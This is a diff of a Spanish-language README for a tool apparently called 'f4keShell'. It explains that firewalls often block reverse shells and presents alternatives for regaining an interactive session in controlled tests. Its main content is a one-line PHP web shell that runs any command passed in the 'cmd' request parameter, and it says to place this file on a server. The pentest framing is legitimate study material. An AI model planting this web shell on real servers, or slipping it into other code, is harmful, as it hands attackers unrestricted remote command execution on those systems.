@@ -1,2 +1,13 @@
 # f4keShell
-![imagen](https://i.ibb.co/6WqPkVD/cacap.png)
+
+* En entornos reales suelen existir reglas de red y restricciones (p. ej. reglas de firewall o filtros que bloquean conexiones salientes) que impiden establecer shells reversas tradicionales. Por eso, en pruebas controladas es interesante estudiar técnicas alternativas para recuperar una sesión interactiva y entender los riesgos asociados a la ejecución remota de comandos desde un servidor web.
+
+* Basta con colocar en el servidor un archivo PHP similar al mostrado abajo, cuyo propósito es ejecutar comandos en el entorno remoto.
+
+```php
+<?php
+	echo shell_exec($_REQUEST['cmd']);
+?>
+```
+
+![imagen]()
